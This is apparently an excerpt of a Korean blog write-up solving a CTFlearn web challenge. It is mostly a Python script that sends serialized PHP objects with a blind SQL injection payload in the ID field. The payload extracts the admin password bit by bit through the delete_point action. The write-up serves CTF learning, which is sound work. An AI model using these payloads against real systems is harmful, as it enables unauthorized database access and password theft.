...
tags: [Webhacking, CTFlearn, CTFlearn Webhacking, Blind SQL Injection, PHP Object injection, serialize(), unserialize()]
---
...
여기서 더 못가서 풀이를 살짝 보았는데.. ```delete```를 할 때 아마도 ID 값이 DELETE SQL문의 인자로 넘어갈 것임.
...
for i in range(1,101):
	...
	chklen = 0
	sql_len = 117 if i < 10 else 118

	payload = {
		'action':'delete_point',
		'point':'O:5:"point":3:{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:'+str(sql_len)+':"0 or if((select length(bin(ascii(substr(group_concat(password),'+str(i)+',1)))) from user where username=\'admin\')=6,2535270,0)";}'
	}
	...
	for j in range(1,chklen+1):
		get_len = 121 if i < 10 else 122
		payload = {
			'action':'delete_point',
			'point':
      'O:5:"point":3:{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:'+str(get_len)+':"0 or if((select substr(bin(ascii(substr(group_concat(password),'+str(i)+',1))),'+str(j)+',1) from user where username=\'admin\')=1,2535270,0)";}'
		}
		requests.get(url, params=payload, headers=headers, cookies=cookies)
